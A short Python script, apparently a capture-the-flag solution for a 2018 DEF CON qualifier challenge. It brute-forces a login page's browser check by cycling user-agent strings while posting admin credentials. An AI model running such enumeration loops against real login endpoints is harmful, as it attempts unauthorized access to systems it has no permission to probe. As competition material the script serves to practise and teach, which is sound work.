import requests
import time

start = False
data = {"username":"admin@oooverflow.io", "password":"admin"}
cookie = 'a3jls5bv5t2aqj5l01tgja31o5'

for user_agent in open("useragent.txt"):
    user_agent = user_agent.strip()
    headers = {'User-Agent': user_agent, 'PHPSESSID': cookie}
    r = requests.post('http://0da57cd5.quals2018.oooverflow.io/login.php', headers=headers, data=data,  allow_redirects=False)
    if not 'Location' in r.headers:
        print(r.text)

    if r.headers['Location'] != 'wrongbrowser.php':
        print("%s" % user_agent)
    r = requests.get('http://0da57cd5.quals2018.oooverflow.io/wrongbrowser.php', headers=headers)
